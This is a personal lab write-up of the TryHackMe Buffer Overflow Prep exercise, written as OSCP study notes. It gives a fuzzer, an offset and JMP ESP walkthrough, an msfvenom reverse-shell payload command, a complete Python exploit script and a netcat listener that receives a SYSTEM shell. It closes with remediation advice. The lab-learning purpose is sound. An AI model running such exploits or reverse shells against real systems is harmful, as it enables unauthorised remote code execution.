# Lab 02: Buffer Overflow - Windows

**Platform**: TryHackMe
**Machine**: Buffer Overflow Prep
**Difficulty**: Easy/Medium
**Date**: December 2024
**Status**: 🔄 In Progress

## Objective

Practice stack-based buffer overflow exploitation on Windows. Learn to:
- Crash the application
- Control EIP register
- Identify bad characters
- Generate shellcode
- Gain remote code execution

## Environment Setup

```
Target: Windows Server 2019 (10.10.x.x)
Attacker: Kali Linux (10.10.x.x)
Vulnerable Application: oscp.exe (running on port 1337)
Debugger: Immunity Debugger with Mona.py
```

## Vulnerability Overview

The vulnerable application accepts user input without proper bounds checking, leading to a stack-based buffer overflow that allows control of the EIP register.

## Exploitation Steps

### Step 1: Fuzzing

Create fuzzing script to crash the application:

```python
#!/usr/bin/python3
import socket, sys

target_ip = "10.10.x.x"
target_port = 1337

# Create increasing buffer sizes
buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target_ip, target_port))

        print(f"Sending buffer of length {len(buffer)}")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        s.recv(1024)
        s.close()

        buffer += "A" * 100
    except:
        print(f"Application crashed at {len(buffer)} bytes")
        sys.exit(0)
```

**Result**: Application crashed at approximately 2000 bytes

### Step 2: Finding EIP Offset

Generate unique pattern to find exact offset:

```bash
# Generate pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400

# Send pattern to application
# In Immunity Debugger, note EIP value: 0x6F43396E
```

Find offset:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6F43396E -l 2400

# Result: Exact match at offset 1978
```

Verify EIP control:

```python
offset = 1978
overflow = "A" * offset
eip = "BBBB"  # Should see 0x42424242 in EIP
padding = "C" * (2400 - offset - 4)

payload = overflow + eip + padding
```

**Confirmed**: EIP shows `42424242` (BBBB in hex)

### Step 3: Finding Bad Characters

Check for bad characters that break the exploit:

```python
# Generate all possible bytes (excluding \x00 which is always bad)
badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    # ... (truncated for brevity)
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

payload = overflow + eip + badchars
```

Using `mona.py` in Immunity Debugger:

```
!mona config -set workingfolder C:\mona\%p
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>
```

**Bad characters found**: `\x00\x07\x2e\xa0`

### Step 4: Finding JMP ESP

Need to find a `JMP ESP` instruction to redirect execution to our shellcode:

```
# In Immunity Debugger with mona
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"

# Found address: 0x625011AF (in essfunc.dll)
# Verify no bad characters in address: ✓
# Verify module not protected (ASLR/DEP): ✓
```

Update EIP with JMP ESP address (little-endian):

```python
eip = "\xaf\x11\x50\x62"  # 0x625011AF in little-endian
```

### Step 5: Generate Shellcode

Generate reverse shell payload:

```bash
msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.10.x.x \
    LPORT=4444 \
    -f python \
    -b "\x00\x07\x2e\xa0" \
    EXITFUNC=thread

# Generated shellcode (351 bytes)
```

### Step 6: Final Exploit

Complete exploit code:

```python
#!/usr/bin/python3
import socket

target_ip = "10.10.x.x"
target_port = 1337

# Shellcode generated with msfvenom
shellcode = (
    b"\xda\xc1\xba\xe4\x11\x4c\x24\xd9\x74\x24\xf4\x58\x33\xc9"
    # ... (truncated for brevity)
)

offset = 1978
overflow = b"A" * offset
eip = b"\xaf\x11\x50\x62"  # JMP ESP address
nops = b"\x90" * 16  # NOP sled

payload = overflow + eip + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
print(f"[+] Sending payload ({len(payload)} bytes)")
s.send(payload + b"\r\n")
s.close()
print("[+] Exploit sent!")
```

### Step 7: Catch the Shell

```bash
# Set up listener
nc -nvlp 4444

# Run exploit
python3 exploit.py

# Shell received!
Microsoft Windows [Version 10.0.17763.737]
C:\Users\admin\Desktop> whoami
nt authority\system
```

## Exploitation Summary

```
1. Fuzzing → Crashed at ~2000 bytes
2. Pattern → Found offset: 1978
3. EIP Control → Verified with "BBBB"
4. Bad Chars → Identified: \x00\x07\x2e\xa0
5. JMP ESP → Found at: 0x625011AF
6. Shellcode → Generated with msfvenom
7. Exploit → Gained SYSTEM shell
```

## Key Learnings

### Buffer Overflow Process

1. **Fuzzing**: Find approximate crash point
2. **Offset**: Calculate exact EIP offset
3. **Control**: Verify EIP control
4. **Bad Characters**: Identify characters that break exploit
5. **Redirect**: Find JMP ESP instruction
6. **Shellcode**: Generate payload avoiding bad chars
7. **Exploit**: Put it all together

### Important Concepts

- **EIP (Extended Instruction Pointer)**: Controls what code executes next
- **ESP (Extended Stack Pointer)**: Points to top of stack (where our shellcode goes)
- **JMP ESP**: Jump to code on the stack
- **NOP Sled**: Padding to ensure shellcode executes cleanly
- **Little-Endian**: Byte order on x86 (reverse the bytes)

### Debugging Tips

1. Always restart the application between attempts
2. Attach Immunity Debugger before sending payload
3. Use mona.py for automation
4. Check for memory protection (ASLR, DEP)
5. Verify shellcode doesn't contain bad characters

## Tools Used

- **Immunity Debugger**: Windows debugger
- **Mona.py**: Immunity Debugger plugin for exploit development
- **Metasploit Pattern Create/Offset**: Finding EIP offset
- **Msfvenom**: Generating shellcode
- **Python**: Scripting the exploit
- **Netcat**: Catching reverse shell

## Mistakes & Lessons

1. **Forgot to restart application**: Led to inconsistent results
2. **Incorrect endianness**: Reversed JMP ESP address incorrectly
3. **Bad character in shellcode**: Regenerated with all bad chars specified
4. **No NOP sled**: Added 16 NOPs for reliability

## Protection Mechanisms

Modern protections that would prevent this exploit:

1. **ASLR (Address Space Layout Randomization)**: Randomizes memory addresses
2. **DEP/NX (Data Execution Prevention)**: Prevents code execution on stack
3. **Stack Canaries**: Detects stack corruption before EIP overwrite
4. **Control Flow Guard (CFG)**: Validates indirect calls

## Remediation

1. **Input Validation**: Check buffer lengths before copying
2. **Use Safe Functions**: Replace unsafe functions (strcpy → strncpy)
3. **Enable Protections**: ASLR, DEP/NX, Stack Canaries
4. **Compile-time Flags**: Use /GS, /NXCOMPAT, /DYNAMICBASE
5. **Code Review**: Audit for unsafe buffer operations

## Time Breakdown

- Understanding the vulnerability: 30 minutes
- Finding offset and controlling EIP: 45 minutes
- Identifying bad characters: 30 minutes
- Finding JMP ESP: 15 minutes
- Generating and testing shellcode: 30 minutes
- **Total**: ~2 hours 30 minutes

## OSCP Exam Notes

**Important for OSCP**:
- You WILL have a buffer overflow question (25 points)
- Practice until you can do it blindfolded
- Have your methodology written down
- Know the process by heart
- Practice different variations

**Time Target**: Complete in 60-90 minutes during exam

## Resources

- [TryHackMe: Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)
- [The Cyber Mentor: Buffer Overflow Course](https://www.youtube.com/watch?v=qSnPayW6F7U)
- [Corelan Team: Exploit Writing Tutorial](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
- [Mona.py Documentation](https://github.com/corelan/mona)

## Practice Tasks

- [ ] Complete TryHackMe Buffer Overflow Prep (all 10 tasks)
- [ ] Practice on different applications
- [ ] Build muscle memory for the process
- [ ] Create personal cheat sheet
- [ ] Time myself (target: <60 minutes)

---

*Buffer overflow is a guaranteed question on OSCP. Master this and it's 25 easy points!*

**Status**: Continuing practice on variations...
